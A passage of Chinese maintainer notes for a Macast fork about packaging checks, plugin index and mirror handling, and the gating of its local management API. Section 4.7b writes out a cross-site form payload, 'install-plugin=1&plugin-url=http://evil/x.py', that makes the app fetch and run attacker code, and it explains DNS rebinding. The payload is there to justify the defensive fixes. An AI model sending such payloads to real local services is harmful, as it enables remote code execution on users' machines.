  我第一遍用斜杠搜，据此差点断言"Linux 产物缺 Pillow ⇒ `gui.py` 模块级 `from PIL import Image`
  会毒掉 `import macast.macast` ⇒ 整个 Linux CLI 起不来"。**那条推理链是对的，前提是假的** ——
  所以报警之前先把 grep 模式验一遍（§10 那条"先拿证据再动手"同样适用于自己的探针）。
  **而且这个方法只答"模块在不在"，答不了"代码是哪一版"**（2026-10-03 验 v0.15.0 的 Windows
  `.exe` 时差点把这条读反）：`.pyc` 在 CArchive 里是 zlib 压缩的，`strings -a` 只看得见 TOC
  的模块名（`macast.plugins.renderer.screen_mirror` 2 次）和 PyInstaller 自己那条运行时路径串，
  看不见任何源码里的常量 —— `Mirror_Max_Duration` / `h264_nvenc` / `avc_codec_of` / `ddagrab` /
  `ffmpeg` 量出来**全是 0 次**，而这个 0 **不证明产物是旧的**。判版本要么解包
  （`pyinstxtractor`）问 `.pyc` 里的常量，要么把产物真跑起来问设置页。macOS 那一侧没有这一层：
  `.app` 里的 `Resources/lib/python3.12/macast/plugins/renderer/screen_mirror.py` 是明文，
  `grep PLUGIN_VERSION` 当场读到 `0.24`（同一份产物里 `aiortc` 在 `python312.zip`、
  `av/.dylibs` 与 `cffi/` 是实体目录、`_cffi_backend.so` 在 `lib-dynload/`、
  `ScreenCaptureKit` 与 `CoreMedia` 的 `.so` 在 `lib-dynload/` —— §4.4 与 §4.6 那两处"只有人记得"
  的打包面，在 CI 产物里逐条核对过。**前三项到 v0.20.0 就不成立了**：P9 把 `aiortc` / `av` /
  `cffi` 整个移出默认产物（§4.15），所以在今天的包搜不到它们**是设计**，别把它读成"产物坏了"）。
  macOS 产物不是 onefile，`Contents/Resources/lib/python3.12/` 下能直接 `ls`
  （`zeroconf/`、`zeroconf/_services/`、`ifaddr/` 都是真目录 = §4.3 那条修复还在），
  其余纯 Python 依赖在 `Contents/Resources/lib/python312.zip`（注意这一层，不在 `python3.12/` 里面）。
- **Linux 产物搜不到 `pystray`（0 次），Windows 有（13 次）—— 这是设计，不是漏装。**
  `build.yml` 那个 job 的标题就写着 *"Linux x86_64 — headless CLI, packaged as a standalone binary"*，
  pip 列表里也从来没有 pystray。它能成立**全靠 §4.2 那条惰性 `_pystray()`**，而这条恰恰是
  Part 50 在 CI 的 Linux runner 上用子进程真的验过的（meta_path 拦掉 pystray + `sys.platform='linux'`
  → `import macast.macast` 且 `cli` 可调用）。所以"Linux 产物没有 pystray"这句话有两层证据，
  别把它当成待修的缺失；反过来，**谁要是把 `import pystray` 提回 `gui.py` 模块顶层，
  Linux 产物就真的起不来了**，而抓得住它的只有那个 CI job。
- **产物里可以有一个"没有任何声明面提到、但运行时按名字要"的文件，而摘掉它的那些依赖就会把它一起带走**
  （v0.21.0 在 `.68` 上量到的出厂缺陷）：Windows 上加载**任何**扩展模块（`.pyd`）之前，CPython 都会先
  解析 `python3.dll`（稳定 ABI 转发库，`Python/dynload_win.c` 的 `_Py_CheckPython3()`：先试主程序旁边，
  再试 `sys.prefix\DLLs\`，且第一条走 `LOAD_LIBRARY_SEARCH_DEFAULT_DIRS` —— **不含用户目录**）。
  PyInstaller 只在**它自己的依赖图需要**时才把 `python3.dll` 打进 onefile：v0.18 的 `.exe` 里装着
  `aiortc`/`av`，TOC **635 项、含 `python3.dll`**；P9（§4.15）把这两个包移出默认产物之后，v0.20 的
  TOC 里 `python3.dll` **0 次** —— 于是应用内一键装落到 `SETTING_DIR/webrtc_extras/` 的那 1,083 个文件、
  52 个 `.pyd`，**在打包好的 exe 里一个都 import 不动**（Win32 **126 `ERROR_MOD_NOT_FOUND`**，
  而这条错误读起来像"这个包坏了/架构不对"，不像"我们少交了一个文件"）。
  **修法在打包侧不在载荷侧**：`build.yml` 的 Windows job 现在先定位 `python3.dll`（在 `sys.executable` 旁边），
  找不到就**响亮 `exit 1`**，然后用 `--add-binary "$PY3DLL;."` 带上那**一个**文件；
  载荷侧的 12 份副本（约 840 KB）是被否掉的形状。**而且这类文件没法靠声明面兜住** —— §4.4 那三处
  （`requirements/*.txt`、py2app 的 `includes`/`packages`、`--hidden-import`）说的都是"某个 Python 名字要装上"，
  没有一处能表达"运行时按文件名要一个 DLL"，所以**唯一能提问的是构建完之后打开归档自己核对**：
  那个 job 现在有一步 `Verify the forwarder actually shipped`，用
  `PyInstaller.archive.readers.CArchiveReader('dist/macast.exe').toc`（**dict**，名字 → tuple）
  问 `python3.dll` 在不在，不在就 `sys.exit(1)`。Part 56/D 把这两步各自的存在钉成文本用例（`--add-binary`
  那一句恰好 1 次；校验步里必须同时出现 `CArchiveReader`、`python3.dll`、`sys.exit(1)`），
  所以删掉任何一步都在 CI 里当场变红，而不是等到某个用户在 Windows 上按下「一键安装」。

### 4.4 `macast/plugins/**` 的"动态导入"打包坑（与 §4.3 同族）

内置插件（IINA / Web / Live / PotPlayer / PIFMRDS / NVA，来自
`xfangfang/Macast-plugins`）**从来不用静态 `import` 引入**：
`MacastPluginManager._load_bundled_plugins` 用 `os.listdir` 拼出 dotted path
再 `importlib.import_module`。**任何依赖扫描器都看不见它们**，所以产物里静默少一个
插件时，源码运行一切正常。

必须同时改三处，少一处就漏：

| 位置 | 要写什么 |
|---|---|
| `scripts/setup_py2app.py` | 加进 **`includes`**（见下） |
| `.github/workflows/build.yml` | 3 个 PyInstaller job 各加 6 个 `--hidden-import=` |
| 新增第三方依赖时 | `requirements/*.txt`（见 §4.3） |

**这一张表有一处例外，是 P9（v0.20.0）刻意的反向**：WebRTC 那两个 pip 包（`aiortc`/`av`）**不再进
前两行**，改为随 Release 发布一条 extras zip、由应用内一键安装（§4.15）。`requirements/*.txt`
里它们的**名字保留**，但含义只剩"从源码跑的那一路 + CI runner 要 import 得起"。
所以第三行不再是"这三处一起改"的自动推论，而 Part 30 那条"macOS CI 装了 darwin.txt 每一样"的
比对也**显式减去** `plugin_repo.EXTRAS_PACKAGES` —— 别把那个减法当成漏洞补回去。

**两套打包工具的选项名不一样，混用会直接让构建失败：**

- py2app 认 **`includes`**；传 `hiddenimports` 会报
  `error: error in setup script: command 'py2app' has no such option 'hiddenimports'`。
- PyInstaller 认 **`--hidden-import=`**（没有 `includes` 这个 CLI 选项）。

我就在这上面栽过一次：源码 206/206 全绿，`bash scripts/build_macos_arm.sh` 直接失败。
**所以改打包配置后一定要真跑一次构建**，别只看测试。

`packages: ['macast']` 会把目录整份拷进去（插件源码散落在
`Contents/Resources/lib/python3.12/macast/plugins/`），其余纯 Python 依赖被 py2app 打进
`lib/python312.zip` —— 所以**别用 `find` 找散文件来判断依赖在不在**，会误判成"缺失"。
正解是查 zip：

```shell
Z=dist/Macast.app/Contents/Resources/lib/python312.zip
python3 -c "import zipfile;print([n for n in zipfile.ZipFile('$Z').namelist() if n.startswith('requests/')])"
```

产物校验手法见 `BUILDING.md` 的 "Verify the bundled plugins actually made it into the artefact"。

### 4.5 插件清单（`<macast.*>`）只在**文件顶部注释**里解析

`_read_plugin_metadata` 先截出开头连续的注释块，再用
`<macast\.([\w.]+)>([^<]*)</macast\.[\w.]+>` 解析。两条约束都是被踩出来的：

- **值里不能出现 `<`。** 早先用 `(.*?)` + `re.S`，于是后面任何一处提到闭合标签的
  注释都会成为假终止符，把中间的标签整段吞掉。给 PotPlayer 写"原作者的 platform
  标签闭合写错了"这句注释时，就把 `renderer` 的值污染成了半句话。
- **只读头部。** 扫码全文只会给正文/文档制造被误认成清单的机会。

`_guess_plugin_class` 是兜底：清单写错类名时按模块体里的类反推，不再直接丢插件。

### 4.5b 插件卡片的作者 / 头像 / 描述（`setting.html`「插件」tab，Part 45）

设置页每张插件卡显示 `<macast.author>`、`<macast.desc>` 与一个头像。三条都已定死并有 Part 45 守着：

- **作者一律以 `pingod` 开头。** 本 fork 自研的插件写 `pingod`；**6 个 vendored 插件写混合作者**
  `pingod（原作者 xfangfang）`（`live.py` 是 `dushan555`）—— 我们不把他人的代码署成自己的名，
  但主名是维护者。文件头的版权声明与 "Copied from" 行**不动**（那是 §4.12 台账的证据）。
- **描述一律中文。** 每个 `macast/plugins/*.py` 的 `<macast.desc>` 必须含中日韩字符；
  `MacastPlugin._builtin_desc(kind)`（内置插件没写自己 `<macast.desc>` 时的兜底，核心三张卡走这条）
  也必须是中文，否则英文 "Built-in renderer." 会漏到中文卡片上。
- **头像走本地图 `/assets/avatar.png`，绝不再按卡片请求 `api.github.com/users/<author>`。**
  那个 host 正是国内网络会卡住的那一个，而十几张卡拉的都是同一个 pingod 头像。
  因此 `setting.html` 里**不允许**出现 `api.github.com/users` 或 `get_github_avatar`；
  `circleUrl` 的初值就是本地资源路径。头像由 `macast/assets/icon.png` 裁成圆形衍生而来。

### 4.6 插件索引与内置策略：地址只有一处，页面不写死

本仓库的 15 个第一方插件**全部内置**（`macast/plugins/renderer/` 与 `macast/plugins/protocol/`，
见代码地图），应用启动时由 `MacastPluginManager._load_bundled_plugins` 自动加载，无需在线索引。
因此仓库根目录的 `plugins/info.json` 现在是**空索引**（`"plugin_v1": []`）—— 不再出现"可更新"
角标，也不会和内置插件重复出卡片（Part 5c 守着"索引不得重复列出内置插件"）。

现在的做法：

- 仓库坐标与索引地址只在 **`macast/plugin_repo.py`**（`pingod/Macast` →
  `plugins/info.json`），由 `/api?query=plugin-info` 的 `plugin_repo` 字段下发；
  `setting.html` 里**不允许**再出现任何插件仓库 URL（Part 5c 有用例守着）。
- **在线索引这一族的"仓库是私有的"这一半前提，2026-10-04 实测已经不成立了**（下面先写今天测到的，再写当初那条决定为什么长那样）。
  **今天（2026-10-04，四条互相独立的匿名探针）**：匿名 `https://api.github.com/repos/pingod/Macast` → **200**
  （`private: false`、`visibility: "public"`），匿名 `…/releases/tags/v0.19.0` → **200**，
  `data.jsdelivr.com/v1/packages/gh/pingod/Macast` → **200**，
  以及对 v0.19.0 那个资产发一次**不带凭据**的 `Range: bytes=0-1023` → **206 / 1024 字节**。
  `scripts/check_index_reachability.py` 同一趟报的是 **`INDEX_OK`，退出码 0**（不是 2）。
  **实际后果比这句话小**：`plugins/info.json` 现在是**空索引**（15 个第一方插件全内置，§4.8），
  所以"别人拉不拉得到索引"对第一方用户体验**没有任何影响**，他们开箱即得；
  改变的只有两件事 —— ① **extras zip 那条新通道是别人真的装得到的**（§4.15：一个 Release 资产，
  应用内一个按钮，匿名可读；2026-10-04 已按这份能力走完一次真安装 —— 已发布字节、sha256 对上
  Release 的 digest、五步全绿），② 设置页的「从网址安装」和第三方插件的手动通道**不再需要为"注定 404"写道歉文案**。
  **历史与决定照旧**：2026-09-21 用户选定「保持私有，官方只承诺手动安装」，理由是匿名读到 404 而公开上游读得到
  （判据与逐条实测见 §5 相应条目；当时 9 条固定链接已有 4 条 404，剩下 5 条是 CDN 在仓库还可读时缓存的副本）。
  所以：
  ① **不要再提"改公开 / 另立公开仓库"** —— 那是已经回答过的问题，而且今天这一半**已经是既成事实**；
  谁看到仓库设置与该决定不一致，是**报告现状**给对方，不是自己动手（那是所有者的账户）。
  ② 索引、`plugins/README.md`、`docs/Casting-Suite.md`、设置页文案仍然把「这里只有源码」说在前面 ——
  理由换了但结论没换：**索引本身是空的**，别让人把"没有卡片"读成"网络坏了"。
  ③ `scripts/check_index_reachability.py` 在私有状态下报 `INDEX_PRIVATE`（退出码 2）曾是**预期信号**；
  **今天它报 `INDEX_OK`**，所以那句"稳定报 INDEX_PRIVATE"已经是历史。判据本身照旧有效：
  一个 404 说不出是"私有"还是"不通"，**必须配一个公开对照组**才能定性（§5 那条教训就是这么来的）。
  `scripts/selfcheck.py` 的「online plugin index」段把这三问都替用户跑一遍
  （GitHub 匿名 + 公开上游对照组 + jsDelivr 元数据 API + 逐条固定链接）。
  Part 5c 的 `git show <sha>:plugins/<file>` 只证明「条目 == 所指内容」，**不证明可达**，两者不要混。
- 索引本体在**仓库根目录**的 `plugins/info.json`（不是 `macast/plugins/`，后者是内置插件）：
  当前为**空索引**（`"plugin_v1": []`），页面只显示本机已内置的插件，不报错。需要发布第三方
  索引时再往里加条目（见下）。
- **索引本身**（唯一一个没法固定 SHA 的文件）走三个地址，按「新鲜度」排序：
  `raw.githubusercontent.com`（永远最新，国内常拉不动）→
  `ghproxy.net/https://raw.githubusercontent.com/...`（国内可达；自称 `max-age=300`，
  实测推送 6 分钟后仍给旧文件）→ `cdn.jsdelivr.net`（**分支文件缓存数小时、`?v=` 也破不了**）。
  也就是说索引最多可能滞后几小时，**但它只影响「新插件多久能被看到」**，装到手的文件永远是对的
  （安装 URL 固定了 SHA，见下）。
  浏览器按序回退；三者都必须返回 CORS 头，因为这是在**浏览器里** fetch，不是 Python 抓。
  改顺序前先想一遍：把会缓存的放前面 = 用户看到的插件列表可能落后半天。
- **设置页拉索引必须带时间戳查询串**（`?t=Date.now()`）：只治**浏览器**的 HTTP 缓存 ——
  索引刚推上去时普通刷新常常还在吃旧副本，「插件卡片不见了」多数就是这么来的。
  CDN 服务端缓存会忽略未知参数，所以固定 SHA 那套不受影响。Part 5c 有用例守着。
- **「启用国内镜像地址」**（`Github_CN_Mirror`，缺 key == 关；关掉走 `Setting.unset` 而不是
  存 `False`）：一个开关改写**所有运行时 fetch 的 GitHub 地址** —— 插件索引（`index_urls()`
  去重后 ghproxy → jsDelivr）、「从网址安装」的下载（`install_url()`）、版本检查
  （api.github.com / releases）、「打开插件仓库」按钮。改写规则只有三个 host 前缀
  （github.com / raw.githubusercontent.com / api.github.com → 加 `https://ghproxy.net/` 前缀），
  **jsDelivr 本身就是国内可达的镜像，绝不再加前缀**。全部逻辑在 `plugin_repo.py`
  （`to_mirror_url` 纯函数 / `mirror_url` 按开关 / `index_urls` / `describe`），页面只发
  `POST set-github-mirror`（在 `Handler.POST_ROUTES` 表里，门 = 管理，见 §4.7c），
  **页面里不允许出现镜像前缀
  字符串** —— Part 5c 有 `"ghproxy" not in _html` 这条用例。切换成功后后端直接回传新的
  `describe()`，页面立刻按新地址重拉索引。
  **这个前缀规则对 Release 资产下载也成立，而且是 2026-10-04 量出来的**（原来只是从索引与 raw
  外推）：同一台机器上 `github.com/.../releases/download/...` 直链回 **0 字节 / curl 000**，
  加前缀的那条跑满 **26,884,399 字节**、`shasum -a 256` 与 Release 自己的 `digest` 逐字一致。
  所以 §4.15 里 `extras_urls()` 的「镜像在前、直链兜底」现在有实测支撑 —— 但**别读成加速**：
  本机量到约 **0.7 MB/min**，而且中段断流后要靠 `-C -` 续传才跑完（七次）。**续传那是探针的手**：
  产品的 `_fetch_extras_zip` **故意不续传**（v0.21 起断流 = 一句「下到 X MB 就断了（整份是 Y MB），
  重试会整份重来」＋整份重来；以前那一句只说「没下载下来」，读的人没法判断断在哪），别把这两件事混成一件。
- 往 `plugins/info.json` 里加条目时：`renderer`/`protocol` 字段是「本机装没装」的判定键，
  `version` 必须与 `.py` 里 `<macast.version>` 一致，否则又是假的「可更新」。整个条目
  和 `.py` 顶部清单必须逐字对齐 —— Part 5c 会比对 title / version / platform / 类名。
- 条目的 `url` **固定到 commit SHA**（`https://cdn.jsdelivr.net/gh/pingod/Macast@<sha>/plugins/<file>.py`），
  绝不指向分支。原因是一轮实测：分支引用会被中间缓存长期冻结 —— jsDelivr 缓存数小时、
  **`?v=` 查询串破不了它**（把插件升到 0.2 后请求 `?v=0.2` 拿回来仍是 0.1 的内容），
  ghproxy 自称 `cache-control: max-age=300`，实测推送后 6 分钟仍在给旧文件。
  固定 SHA 之后内容不变，缓存多旧都是对的（raw 直链在国内还是经常拉不动，所以走 jsDelivr 的 CDN 入口）。
  代价是插件更新的流程变成两步：**① 先提交插件文件；② 再把条目里的 SHA/version 指到那个提交**。
  Part 5c 用 `git show <sha>:plugins/<file>` 校验「条目 ↔ 所固定内容」一致，忘了第 ② 步会当场变红。
  安装是 Python 侧 `requests`（`MacastPluginManager.install_url`）拉的，没有浏览器多地址回退，
  出问题时把 raw 直链粘到设置页的「从网址安装」即可（后端本来就先 `split('?')[0]` 再判 `.py`）。
- 第三方/用户自建插件与内置插件是**两回事**：放进 `plugins/info.json` 索引、由用户从设置页
  「从网址安装」或把 `.py` 丢进配置目录 `renderer/`、`protocol/` 的，是「单个 .py、只能用
  Macast 自带依赖 + 标准库 + 外部命令」；需要 pip 库或要随包发布的第一方插件一律走
  `macast/plugins/`（并同步 §4.4 的三处打包配置）。
- **「只能用自带依赖」现在是一条会被测红的规则**（Part 30）：每个 `macast/plugins/*.py` 的 import
  取根名，必须落在 `标准库 ∪ requirements/*.txt 声明的包提供的顶层模块 ∪ {macast, macast_renderer}`
  里，否则就是"插件里塞了个 pip 库"。平台专属的名字走 `_PLATFORM_OPTIONAL` 表
  （模块名 → 发行包 → 哪个 requirements 文件声明了它），因为**在 Linux 上跑套件时
  `importlib.metadata` 根本看不见 pyobjc**，只能按规则放行、再由"那个文件真的声明了它"兜住。
  第二张表 `_OPTIONAL_BY_FALLBACK` 收的是另一类：**任何构建都不装、靠代码自己降级**的模块
  （现仅 `win32api` / `win32con` —— `potplayer.py` 只用它读注册表拿 PotPlayer 安装路径，
  代码自己写着 "missing pywin32 … mean 'ask the next source', not 'fail'"，依次回退到用户
  配置路径与两个默认安装位置）。放行条件是**把断言验回代码上**：该 import 必须真的坐在
  `try/except ImportError` 里、且在 except 里被赋成 `None`，否则不放行 —— 不然这张表就是
  "什么都不声明、什么都能 import"的后门。**别把它塞进 `_PLATFORM_OPTIONAL`**：那要求一个
  windows requirements 文件，而没有任何 job 会安装它，等于把 §4.3 的错反着犯一遍。
  `cheroot` 是同一族问题的另一面：`nirvana.py` 直接子类化 `cheroot.server.*`，而 cheroot
  只是 cherrypy 的传递依赖 —— 已按 darwin.txt 对 pyperclip/pyobjc 的同一条原则在
  `requirements/common.txt` 里点名。
  **pyobjc 之问有结论了**：`screen_mirror._create_aggregate` 用的 `Foundation`（以及
  `_cf_to_str` 用的 `objc`）**是合法的**，因为 `macast/utils.py` 在 `sys.platform == 'darwin'`
  下就 import 了 `AppKit` —— 同一个发行包 `pyobjc-framework-Cocoa`，核心代码先它一步依赖。
  但按 §4.3 的教训**不再让它靠 `rumps` 顺带进来**：`requirements/darwin.txt` 与 CI 的
  macOS pip 列表都点名了它，Part 30 同时守着这两处，还有两条用例守着
  `macast/plugins/renderer/screen_mirror.py` 不能把 pyobjc 提到**模块顶层**（提到了 Windows/Linux 就整个加载不了）。
  **到了 ScreenCaptureKit 这一轮（2026-10，v0.21）同一套机制被复用了两遍**：
  `screen_mirror` 的 macOS 13+ 快路要 `ScreenCaptureKit` + `CoreMedia` 两个 pyobjc 包
  （import 同样在函数体里 —— 提到模块顶层 Windows/Linux 就整个加载不了），
  于是 `_PLATFORM_OPTIONAL` 新增两行，两条"这个文件真的声明了它"的用例自动派生；
  `_darwin30 - _ci30` 那条继续覆盖 macOS CI 列表，`_hoisted` 那条继续守模块顶层。
  **唯一没被自动覆盖的是 `.app` 构建自己的那张表**：py2app 的 modulegraph 看不见函数体内
  的 import（与 §4.4 的动态导入是同一片盲区），从 `scripts/setup_py2app.py` 的 `includes`
  里丢一个条目，产物照样构建、照样启动、**静默停在 avfoundation 上**。所以 Part 55 有一条
  按名字点名这两个条目的用例 —— 三处打包配置里，只有这一处没有声明面推着，需要人记得。

索引格式、字段表与验证命令见 `plugins/README.md`。

### 4.7 网页投屏入口：GET 版即使来自本机也要求令牌

给「只能打开网址」的调用方（iOS 快捷指令、书签、`curl`、脚本）留了
`GET /api?query=cast&url=<绝对地址>&token=<令牌>`，绕开 DLNA 发现。设置页重投历史用的
`POST cast-uri` 语义保持不变。

- **GET 版必须带令牌，loopback 也不例外**：任何网页都能发一个
  `GET http://127.0.0.1:58880/api?query=cast&...`（`<img>` / `fetch`）。若沿用
  「本机即可信」，就等于随便哪个网页都能指使你的 Mac 开始播片。POST 版没这条通道，
  所以继续信任 loopback —— 但 `cast-uri` 在表里的门就是 `GATE_MANAGEMENT`（§4.7c），
  它靠的正是 `_management_allowed()` 的本机判定，**动这里之前先想清楚 CSRF**。
- **令牌常驻**：`protocol.api_token()` 存在 `macast_setting.json` 的 `Api_Token`，
  首次使用时生成（`threading.Lock` 串行化，避免并发首用生成两个）。以前它是
  `secrets.token_hex(16)` 每进程随机、且从不显示在任何地方 —— 等于管理 API 对
  「另一台设备」永久不可用，快捷指令根本没法配。改完必须保持稳定，否则已配好的
  快捷指令会在下次启动后 403。
- 令牌出现在两处：设置页「状态 → 网页投屏入口」（可复制，附 curl 例子）和高级设置的
  JSON 里。`cast-info` 查询本身走管理门控（本机 / HTTPS / 令牌），局域网拿不到它 ——
  这是「令牌不外泄」的唯一防线，别把它从门控名单里删掉。
- 回归用例是 Part 12（19 条）。它借 CherryPy 在**无请求上下文**时给出的假 loopback
  请求真跑门控（`cherrypy.serving.request` 可直接改 `params` / `headers` / `remote` /
  `scheme`），不需要真起服务；唯一被打桩的是 `Setting.is_service_running`（GET 在服务
  未启动时会回 503）。

### 4.7b 管理 POST 的两道新门：跨站表单与"会落代码"的那三条（Part 48）

2026-09-25 实测：用户访问一个恶意网页，它向 `http://127.0.0.1:58880/api` 提交一个
`application/x-www-form-urlencoded` 的 form（**simple request，浏览器不发预检**），字段
`install-plugin=1&plugin-url=http://evil/x.py`，服务端 `_management_allowed()` 只看
`remote.ip` ⇒ 门开 ⇒ 下载 ⇒ `import` ⇒ **那个 .py 的模块级那一行以用户身份执行**
（不需要用户去启用那个渲染器）。这条链在真实例上跑通过（修复前 4/4），现在也跑得通
（修复后：两种攻击形状各自 403、插件目录与载荷标记文件都没落地；两种合法形状仍然真的装上）。
细节与验收记在 `docs/architecture-review-2026-09.md` 的 R1「已修」一节。

两道门，**缺一不可**，都在 `macast/protocol.py`：

1. **`Handler._same_site()`：所有 POST 的第一问。** `Origin` →（缺失时）`Referer`；
   两者都没有就**不是浏览器**（curl / 快捷指令 / HA），继续按地址 + 令牌判。有则归一化成
   `(host, port)`（`site_of()`：小写、去尾点、去 80/443、IPv6 去方括号），再问是不是
   这台机器自己的网址（`_page_host_names()`：回环三种拼法 ∪ `advertisable_addresses()`
   ∪ `Setting.get_advertisable_ip()` ∪ 主机名/短名/`.local`）。
   - **判据绝不是"这个域名解不解析到我"** —— DNS 重绑定下攻击者那个域**恰恰**解析到
     `127.0.0.1`，那就是这一招本身。所以是"名字比对"，不是"地址比对"。
   - **端口不参与判定**（docstring 里写着原因）：58880 被占时 Macast 自己回退到随机端口，
     钉死会把自家页面挡在外面，而这里根本没有 cookie 可骑。
   - 被拒时消息必须**同时**说出"你从哪个网址来的"和"该用哪个网址"，否则用户读到的是
     一个像令牌错的东西。
   - `Origin` 优先于 `Referer`（页面能自己挑 `Referer`），读不懂的 `Origin` 一律拒。
2. **`_CODE_EXECUTION_PARAMS` + `_code_execution_allowed()`：落代码的只认令牌。**
   `install-plugin`、`save-launch-param`（整体覆盖设置并重启）、`set-module-setting`
   （自动化钩子的键写在这里，值进 `subprocess(shell=True)`），外加 `plugin-file` 上传。
   **loopback 在这一层不算数** —— 重绑定下"本机"这个事实毫无信息量。`mirror-action`
   不在名单里，它早有自家令牌判定（§4.7 的先例）。
   用例还钉住"这一名单必须是 `_MANAGEMENT_PARAMS` 的子集"，否则可能出现"落代码却不受管"的字段。
   （自 §4.7c 起，这两份名单都从 `Handler.POST_ROUTES` 派生，所以这条子集关系是**结构成立**的；
   真正还钉着的是另一头 —— 表里 `GATE_CODE` 那三行必须恰好是这一名单。）

**页面侧必须带令牌，且取不到就不发**：共享的 `management_token()`（令牌来自本机门控的
`query=cast-info`）+ `require_management_token(fd)`，五条流程各就各位 ——
`install` / `install_from_url` / `save`（高级设置）/ `post_module_setting`
（`save_module_setting` 与 `remove_module_setting` 都收口到它）/
`on_plugin_before`。**`el-upload` 自己不会带令牌**：`before-upload` 改成 `async`，
先 `await` 把令牌取回来（Element UI 会等这个 Promise，resolve 非 File 值照样继续发），
`$nextTick()` 之后 `:data="{ 'plugin-type': …, token: cast_info.token }"` 才是有值的。
套件里没有浏览器，所以页面这半份是**文本契约**（§4.13 的方法），变异体"某条流程漏带令牌"
会让对应那条变红。

**已知代价（是决定，不是待办）**：用 Macast 叫不出名字的主机名打开设置页（自建反向代理、
少见的 DNS 别名）时管理 POST 会被拒，提示让用户改用 `http://127.0.0.1:<端口>/`。
没有改成"再信 `Host` 头"，因为 `Host` 在重绑定下同样毫无信息量 —— 那条路挡不住要挡的东西。
**仍然成立的边界**：拿到令牌 = 能落代码（这是设计如此，PoC 的正控就是这么写的），
所以令牌的保密性就是这条链的强度；局域网侧拿不到令牌（`cast-info` 在门控名单里）。

### 4.7c 一张表决定所有 POST 的门（`Handler.POST_ROUTES`，Part 51）

§4.7b 那两道门当初是**手写在 `POST()` 的十几个 `elif` 里的**，每条分支自己决定用令牌、
用本机、还是不用门 —— 这正是 R1 的成因：**"漏一个端点没加门"这类错误在结构上看不见**。
现在门是**数据**：`Handler.POST_ROUTES` 一行一个端点 `(字段, 门, 方法名)`，
`FILE_ROUTES` 管上传（按字段名，`plugin-file` = `GATE_CODE`；没登记的文件字段吃
`FILE_GATE_DEFAULT` = 管理门），`POST()` 只做两件事 —— `_same_site()` 和按表走一遍。
三条门名 `GATE_MANAGEMENT` / `GATE_TOKEN` / `GATE_CODE`，各自那句 403 收在
`GATE_REFUSALS` 里（**一条路由不能自己写拒绝文案，也不能不写**）。

- **顺序即语义**：`POST_ROUTES` 是 **tuple 不是 dict** —— 一个请求带两个 action 字段时，
  排在前面的那条赢，后面的根本不跑（Part 51 有 precedence 用例）。旧代码同样是"第一个
  匹配的 `elif` 赢"，所以这次改造**逐行保住了原顺序**，没有改任何一条的判定。
- **`_MANAGEMENT_PARAMS` / `_CODE_EXECUTION_PARAMS` 现在是从表里派生的**，不是另抄一份。
  旧文档里"某某在 `_MANAGEMENT_PARAMS` 名单里"这类说法，读法改成"某某在表里，门是 X"。
  顺带记一条**语义没变、名单变了**：旧的那份字面名单只有 12 条，`cast-uri`、
  `set-subtitle-show`、`clear-play-history`、`clear-log` 不在其中 —— 它们各自在分支里
  就地调 `_management_allowed()`，所以从不经过顶部那道批量检查。派生名单现在把它们算进去
  （= 表里全部条目；**2026-10-20 数出来是 23 条**，本节写下时是 16 条 —— 那 7 条是一条条加进表里的，
  而名单从表派生，所以**判定从来没错、只有这句话的数字腐烂了**。Part 51 的地板是 `>= 16`，它拦得住
  "表被读成空元组"，拦不住"数字落后 7 行" —— 与 Rust 侧把路由表的地板换成 `==` 是同一条教训的第二遍），
  因为按定义"能被 POST 的都至少受管理门"；这不影响任何一条的判定，
  但谁要拿这个名单去推断"旧版谁走了顶部批量检查"，答案已经不再是它。
- **`_gate_refusal()` 的三道检查是累积且有序的**：`token` 与 `code-execution` 都先要过
  管理门，所以局域网无令牌的请求听到的仍是管理那句 —— 和当初手写分支的措辞逐字一致。
  **门名不认识就拒绝**（fail closed）：表里写错一个门，后果是那个端点谁都进不来，
  而不是谁都进得来。
- **fall-through 从"报成功"改成了"报没做"**：这是这一趟顺手抓到的**真 bug** ——
  旧 `POST()` 走到末尾返回 `{'code': 0, 'message': 'success'}`，于是字段名拼错
  （`clear-logg`）、或页面加了一个后端从没听过的按钮，用户读到的是"已保存"而什么都没发生。
  现在回 `code: 1` 并把不认识的字段**念回给调用方**，同时 `logger.error` 一条。
  `POST_HELPER_PARAMS` 是"贴在 action 旁边的字段"（token / key / value / plugin-url …），
  它们不该被念成"不认识的字段"，也不该单独构成一次操作。
- **Part 51 的门覆盖是"按表循环"，不是按记忆点名**：把表里**每一行**都拿一个局域网、
  无令牌的请求打一遍，断言 403 **且那条路由的方法一次都没被调用**（逐行装 spy），
  再带令牌打一遍，断言每一行真的被服务到；另有一条"这个循环不为空（≥16 行）"，
  防止哪天把表读成空元组、于是"全部端点都被验证过"是一句真空话。
  还有 AST 扫描（范围**限定在 `class Handler` 内**）钉住：`POST` 恰好一个、
  不直接调用任何门判定（`_same_site` 除外，它就是那条链的第一问）、
  必须读 `POST_ROUTES` / `FILE_ROUTES` / `_gate_refusal`、且不许把任何路由字段名
  硬编码进 `POST` —— **否则这张表就变成文档，而文档正是 R1 写下的那种东西**。
- **页面侧对齐**：用例从 `setting.html` 抽出所有 `append('字段'…)`、三元表达式里的字段名、
  以及 `name="…"`（后者只与 `FILE_ROUTES` 求交，避免撞上普通表单输入），要求
  **页面能 POST 的每个字段都在表里登记**，且至少有 10 个 action。这是"新增按钮悄悄落到
  一个不认识它的分发器上"唯一能被机器抓住的时刻。
- **诚实的一条**：这一趟 `Handler` 类**变大了**（≈846 行 → ≈980 行），因为 16 个 `_post_*` 薄包装
  现在都住在类里，而旧的分支体本来就挤在同一个函数里。省下的不是行数，是"读一处就知道所有门"。
  下一步如果是拆，方向是**按面拆文件**（管理 API / DLNA 收流 / 页面资源），那是独立一步，
  别和改判定混在同一次提交里。
- 四个变异体各自只在自己那一句话上变红：**A** 把未识别请求的返回值改回 "success" ⇒ 3 条；
  **B** 删掉表里的一行（`set-module-setting`）⇒ 9 条（派生名单、按表循环、页面侧对齐三处同时塌，
  这正是"少一条在结构上可见"的意思）；**C** 把 `mirror-action` 的门从 `GATE_TOKEN` 降成
  `GATE_MANAGEMENT` ⇒ 3 条；**D** 让未知门名放行（fail open）⇒ 1 条。
  还原后 `protocol.py` 与改动前逐字节一致（md5 比对）。
  其中一个（B）抓出的是**测试自己的**休眠分支：
  `gate_of()` 读模块而非类，只在被扫到那一行才 `AttributeError` ——
  已改读 `protocol.Handler.FILE_ROUTES`，并补一条 `gate_of('plugin-file') == GATE_CODE`
  让这条分支每次跑都被经过。

### 4.8 内置插件目录（`macast/plugins/`）：15 个插件，各自的红线

`macast/plugins/` 内置 15 个第一方插件：6 个来自上游合集 `Macast-plugins`
